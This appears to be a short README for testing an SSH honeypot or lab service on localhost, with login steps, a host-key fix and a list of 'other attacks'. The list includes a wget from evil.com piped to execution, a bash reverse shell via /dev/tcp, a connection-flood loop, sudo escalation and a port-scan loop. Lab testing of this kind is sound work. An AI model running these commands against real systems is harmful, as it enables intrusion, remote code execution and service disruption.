"# HACK-" 
open cmd : to login 
ssh admin@localhost -p 2222

try worng passwords 
correct password :password

once login try : 

<img width="465" height="457" alt="image" src="https://github.com/user-attachments/assets/e1ff4779-e72b-420d-a613-dd4a13f253c3" />

<img width="605" height="369" alt="image" src="https://github.com/user-attachments/assets/4aa931a3-a8cc-4cdd-8e4c-cbbd13d9c178" />

in cmd if the following error occurs 

""""" @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that a host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
SHA256:0c20MU9M8La+J3A0ZHkPyid89qFn3zJfkqB5gorgKUk.
Please contact your system administrator.
Add correct host key in C:\\Users\\Dell/.ssh/known_hosts to get rid of this message.
Offending RSA key in C:\\Users\\Dell/.ssh/known_hosts:1
Host key for [localhost]:2222 has changed and you have requested strict checking.
Host key verification failed.  """""

try : ssh-keygen -R "[localhost]:2222"
then again : ssh admin@localhost -p 2222


other attacks :
Connection Flood:
for /L %i in (1,1,10) do start ssh admin@localhost -p 2222

Malicious Command Injection:
ssh admin@localhost -p 2222 "wget http://evil.com/script.sh -O /tmp/script.sh; chmod +x /tmp/script.sh; /tmp/script.sh"

Reverse Shell Attempt:
ssh admin@localhost -p 2222 "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

Sudo Privilege Escalation:
ssh admin@localhost -p 2222
# Then in session: sudo su

Port Scanning:
for /L %i in (1,1,100) do (
  timeout 1 ssh admin@localhost -p %i 2>nul && echo Port %i is open || echo Port %i is closed
)

